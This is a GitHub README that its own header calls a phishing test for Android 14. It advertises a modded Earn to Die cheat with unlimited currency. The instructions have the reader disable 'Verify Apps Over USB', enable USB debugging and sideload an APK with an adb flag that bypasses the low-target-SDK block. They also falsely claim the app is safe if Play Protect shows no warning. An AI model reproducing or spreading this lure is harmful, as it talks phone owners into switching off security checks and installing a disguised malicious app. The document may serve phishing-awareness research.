# Earn-To-Die-Malicious-API-
<ins>*__Note: This is a repo for testing android 14 hacking. Do not install if you are not authorized. Everything from this point on is used for phishing, do not install or do this setup outside of a contained environment.__*</ins>

## Earn to Die Cheat Version 
This is the modded version of the mobile game Earn to Die, the cheat allows you to get all the unlockables and infinite currency in the game.
<p align="center">
  <img width="600" height="400" src="https://github.com/user-attachments/assets/ab954d40-3ba3-4649-98ec-9ab6077eca88">
</p>
<p align="center">
  <img width="600" height="400" src="https://github.com/user-attachments/assets/3f36475e-76ed-4635-b9c3-84d9ecd05253">
</p>
<p align="center">
  <img width="600" height="400" src="https://github.com/user-attachments/assets/9e3803fc-9d91-42f5-9fb0-771e2918b2dc">
</p>

## <ins>Setup</ins>

### Turn off Verify Apps Over USB Setting:
 ``` Verify Apps Over USB ``` must be turned off because it doesnt allow the older apps in newer devices to be installed. This step is crucial as you wont turn it off, you will get an error ```"App not isntalled as app is not compatible with your phone"```
 This error occurs because apps designed for older versions of Android do not have the latest security requirements enforced by Google Play Protect.
- Open ```Settings```.
- Go to USB settings .
- Turn ```Verify Apps Over USB``` on or off.
- FOTO BURAYA KOYULMALI SETTINGS FOTOSU
- ```'NOTE!``` "After installation, using the guidelines provided below, if you suspect that the app may contain malicious behavior, immediately go to Play Protect and scan all apps before running the app. If Play Protect doesn’t give you a warning, then the app is safe to run.
  
### Making the app availbale for newer devices:
1. Enable Developer options on your Android 14 device
    - Open the ```Settings``` app on your phone.
    - Scroll down until you find the ```About Phone``` option and tap on it.
    - Scroll down until you find ```Build Number``` and then tap on Build number ```seven``` times to enable ```developer mode```.
2. Enable USB Debugging
    - Go back to the ```Settings``` screen.
    - Scroll down until you either see ```Developer Options``` and tap on that, or if you don’t see it, open the ```System menu``` and scroll down until you see ```Developer Options``` and tap it.
    - Scroll down until you see the ```USB debugging``` toggle and flip it to the on position.
    - You may see a pop-up asking if you’d like to allow ```USB debugging```. If you do, select OK. You can always disable this feature after installing your app.
<p align="center">
  <img width="400" height="500" src="https://github.com/user-attachments/assets/30417183-93c9-40a5-bd81-8598a11807e8">
</p>

### Enabling ADB debugging:
1. There are multiple ways to do this, and the instructions vary a bit depending on whether you’re using a Windows, Mac, or Linux PC. But in a nutshell, the first step is to download the latest version of Google’s SDK Platform Tools for your operating system.
    - Next, unzip the file to a folder on your computer
    - Navigate to the directory where you’ve unzipped the contents, and you should see a bunch of tools including adb and fastboot.
    - Open a ```terminal, command prompt, or Powershell``` window to this directory.
    - Connect your Android 14 phone or table to your computer with a ```USB cable```.
    - In the terminal window on your PC, type the following command:
      - ```adb devices```
    - You should see a pop-up on your screen asking you to ``allow USB debugging``. Tap the option to allow.
    - Type the ```adb devices``` command again, if necessary, and you should see a list of devices attached to your computer, with one entry for your phone or tablet.
2. Download and install your old Android app
    - At this point, you can download the APK installer file.
    - Copy that app to the same ```Platform Tools``` directory on your computer
        - An example of a directory would be: ```C:\Android\platform-tools```
    - Run the following command in your terminal/command line window:
      - ```adb install --bypass-low-target-sdk-block FILENAME.apk```
  ### Commands for Mac and Windows:
  For **Mac**:    
1) Run the following commands:
2) ./adb devices
3) ./adb install --bypass-low-target-sdk-block FILENAME.apk

## For **Windows** CMD: 
1) Run the following commands:
2) .\adb devices
3) .\adb install --bypass-low-target-sdk-block
<p align="center">
  <img width="700" height="500" src="https://github.com/user-attachments/assets/a661bfac-dd1c-42b0-bd05-b479da223655">
</p>

That’s it. If everything went according to plan, the app should now be available on your Android device.

